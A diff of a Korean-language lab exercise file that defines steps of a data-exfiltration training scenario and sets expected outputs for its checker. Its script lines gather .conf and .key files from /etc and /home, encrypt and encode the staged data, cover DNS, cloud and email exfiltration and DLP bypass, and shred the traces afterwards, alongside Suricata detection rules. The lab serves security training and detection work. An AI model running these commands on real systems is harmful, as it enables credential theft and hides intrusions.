@@ -28,7 +28,7 @@ steps:
     시스템 정보, 네트워크 구성, 자격증명 파일이 주요 대상이다. MITRE ATT&CK T1074(Data Staged)에 해당한다.
   verify:
     type: output_contains
-    expect: null
+    expect: exfil_staging
     field: stdout
   target_vm: attacker
   script: mkdir -p /tmp/exfil_staging && find /etc /home -name '*.conf' -o -name '*.key'
@@ -51,7 +51,7 @@ steps:
     -pbkdf2로 키 유도를 강화한다. 실제 APT 그룹은 커스텀 암호화나 XOR 인코딩으로 시그니처 탐지를 회피하기도 한다.
   verify:
     type: output_contains
-    expect: null
+    expect: exfil_data.enc
     field: stdout
   target_vm: attacker
   script: tar czf /tmp/exfil_data.tar.gz -C /tmp/exfil_staging . && openssl enc -aes-256-cbc
@@ -74,7 +74,7 @@ steps:
     T1048.001에 해당한다.
   verify:
     type: output_contains
-    expect: null
+    expect: Data size
     field: stdout
   target_vm: attacker
   script: 'ENCODED=$(base64 -w 0 /tmp/exfil_data.enc) && echo "Data size: $(echo -n
@@ -99,7 +99,7 @@ steps:
     길이와 엔트로피를 모니터링한다.
   verify:
     type: output_contains
-    expect: null
+    expect: DNS query
     field: stdout
   target_vm: attacker
   script: 'echo ''secret data for DNS exfil'' | base32 | tr -d ''='' | fold -w 50
@@ -123,7 +123,7 @@ steps:
     제한적이다.
   verify:
     type: output_contains
-    expect: null
+    expect: Data in hex
     field: stdout
   target_vm: attacker
   script: 'DATA_HEX=$(echo -n ''exfil'' | xxd -p) && echo "Data in hex: $DATA_HEX"
@@ -149,7 +149,7 @@ steps:
     steghide는 JPEG에 AES 암호화된 데이터를 삽입한다.
   verify:
     type: output_contains
-    expect: null
+    expect: Steganography
     field: stdout
   target_vm: attacker
   script: 'echo -e ''GIF89a\x01\x00\x01\x00\x00\x00\x00;'' > /tmp/cover.gif && echo
@@ -173,7 +173,7 @@ steps:
     전송 탐지를 회피한다. 실제 APT 그룹은 업무 시간에만 소량씩, 정상 트래픽 패턴과 유사하게 전송하여 이상행위 탐지를 어렵게 만든다.
   verify:
     type: output_contains
-    expect: null
+    expect: Chunked Exfiltration
     field: stdout
   target_vm: attacker
   script: 'split -b 100 /tmp/exfil_data.enc /tmp/chunk_ && echo ''=== Chunked Exfiltration
@@ -204,7 +204,7 @@ steps:
     수준에서 비인가 접근을 탐지할 수 있다.
   verify:
     type: output_contains
-    expect: null
+    expect: Cloud Storage Exfiltration
     field: stdout
   target_vm: attacker
   script: "echo -e '=== Cloud Storage Exfiltration ===\\n\\n[AWS S3]\\ncurl \\\n \
@@ -238,7 +238,7 @@ steps:
     드래프트 폴더를 공유 저장소로 사용하면 발신 기록이 남지 않아 탐지가 더 어렵다. DLP는 암호화된 첨부파일에 대한 알림 정책을 구현해야 한다.
   verify:
     type: output_contains
-    expect: null
+    expect: Email-Based Exfiltration
     field: stdout
   target_vm: attacker
   script: 'echo -e ''=== Email-Based Exfiltration ===\n\n[Method 1: SMTP via curl]\ncurl
@@ -271,7 +271,7 @@ steps:
     캡처를 추적할 수 있다.
   verify:
     type: output_contains
-    expect: null
+    expect: Physical Exfiltration
     field: stdout
   target_vm: attacker
   script: 'echo ''=== Physical Exfiltration Channels ==='' && echo '''' && echo ''[USB
@@ -305,7 +305,7 @@ steps:
     동시에 모니터링해야 한다.
   verify:
     type: output_contains
-    expect: null
+    expect: Exfiltration Channel Comparison
     field: stdout
   target_vm: attacker
   script: 'echo -e ''=== Exfiltration Channel Comparison ===\n\nChannel      | Bandwidth   |
@@ -340,7 +340,7 @@ steps:
     우회한다. 효과적인 DLP는 네트워크, 엔드포인트, 클라우드의 3계층에서 동시에 동작하고, UEBA로 비정상 행위를 탐지해야 한다.
   verify:
     type: output_contains
-    expect: null
+    expect: DLP Bypass
     field: stdout
   target_vm: attacker
   script: 'echo -e ''=== DLP Bypass Techniques ===\n\n[Content Inspection Bypass]\n1.
@@ -378,7 +378,7 @@ steps:
     옵션으로 오탐을 줄인다.
   verify:
     type: output_contains
-    expect: null
+    expect: Suricata
     field: stdout
   target_vm: attacker
   script: 'echo -e ''=== Suricata Exfiltration Detection Rules ===\n\n# DNS Tunneling:
@@ -407,7 +407,7 @@ steps:
     복구를 방지한다. 실제 공격에서 APT 그룹도 안티포렌식 기법으로 흔적을 제거한다.
   verify:
     type: output_contains
-    expect: null
+    expect: removed
     field: stdout
   target_vm: attacker
   script: shred -u /tmp/exfil_data.enc /tmp/exfil_data.tar.gz 2>/dev/null; rm -rf
@@ -476,7 +476,7 @@ steps:
     최소화하는 것이 현실적인 목표이다.
   verify:
     type: output_contains
-    expect: null
+    expect: Exfiltration Defense Strategy
     field: stdout
   target_vm: attacker
   script: 'cat > /tmp/exfil_defense.txt << ''EOF''
